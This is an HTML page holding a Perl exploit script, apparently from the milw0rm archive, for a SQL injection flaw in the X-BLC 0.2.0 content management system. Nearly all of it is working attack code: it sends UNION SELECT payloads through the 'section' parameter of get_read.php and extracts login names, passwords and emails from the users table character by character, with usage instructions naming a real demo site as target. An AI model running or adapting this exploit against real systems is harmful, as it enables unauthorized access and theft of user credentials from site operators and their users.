<html><head><title>X-BLC 0.2.0 (get_read.php section) SQL Injection Vulnerability</title></head><pre>#!/usr/bin/perl -w

#  :::::::-.   ...    ::::::.    :::.
#   ;;,   `';, ;;     ;;;`;;;;,  `;;;
#   `[[     [[[['     [[[  [[[[[. '[[
#    $$,    $$$$      $$$  $$$ &quot;Y$c$$
#    888_,o8P'88    .d888  888    Y88
#    MMMMP&quot;`   &quot;YmmMMMM&quot;&quot;  MMM     YM
#   [ Discovered by dun \ dun[at]strcpy.pl ]
#
######################################################
#  [ xblc &lt;= 0.2.0 ]   SQL Injection Vulnerability   #
######################################################
# 
# Script: &quot;X-BLC is a dynamic web content management system written in PHP...&quot;
#
# Script site: http://www.biolawcom.de/xblc/ ,	http://sourceforge.net/projects/xblc/
# Download: http://downloads.sourceforge.net/xblc/xblc-0.2.0.zip?use_mirror=fastbull
#
# Usage: perl expl.pl http://www.biolawcom.de/demo/
#
#######################################################
#
# [ dun / 2009 ] 

use IO::Socket;
use Socket;
use IO::Select;

my @tables=(&quot;id&quot;,&quot;login_name&quot;,&quot;password&quot;,&quot;email&quot;,&quot;status&quot;);

if(scalar(@ARGV) &lt; 1) {
	print &quot;\nUsage: perl expl.pl http://site.com/path/\n\n&quot;;
	exit;
}

foreach $t (@tables) {
$i=1;
print $t.&quot; = &quot;;
  do {
	$path 	= &quot;include/get_read.php?section=-1+UNION+SELECT+ORD(SUBSTRING(&quot;.$t.&quot;,&quot;.$i.&quot;,1))+FROM+users/*&quot;;
	$host 	= $ARGV[0].$path;
	#############################################
	# $page = http_query($host, $proxy, $port); #
	#############################################
	$page = http_query($host);
	$page =~ /guest=(.*)\,runTime=/;
	$char=$1;
	print chr($char);
	$i++;
  } while($char != 0);
  print &quot;\n&quot;;
}
  
sub http_query {
 my $page=&quot;&quot;;
 my $url=$_[0];
 if(defined($_[1]) &amp;&amp; defined($_[2])) {
	$host=$_[1];
	$port=$_[2];
	$get=&quot;GET $url HTTP/1.0\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\nCookie: id=1\r\nConnection: Close\r\n\r\n&quot;;
 } else {
	$port=80;
	$url=~s/http:\/\///;
	$host=$url;
	$query=$url;
	$host=~s/([a-zA-Z0-9\.]+)\/.*/$1/;
	$query=~s/$host//;
	if ($query eq &quot;&quot;) {$query=&quot;/&quot;;};
	$get=&quot;GET $query HTTP/1.0\r\nHost: $host\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\nCookie: id=1\r\nConnection: Close\r\n\r\n&quot;;
 }
 my $sock = IO::Socket::INET-&gt;new(PeerAddr=&gt;&quot;$host&quot;,PeerPort=&gt;&quot;$port&quot;,Proto=&gt;&quot;tcp&quot;,Timeout =&gt; 3) or return;
 print $sock $get;
 my @r = &lt;$sock&gt;;
 $page=&quot;@r&quot;;
 close($sock);
 	
 return $page;
}

# milw0rm.com [2009-03-23]</pre></html>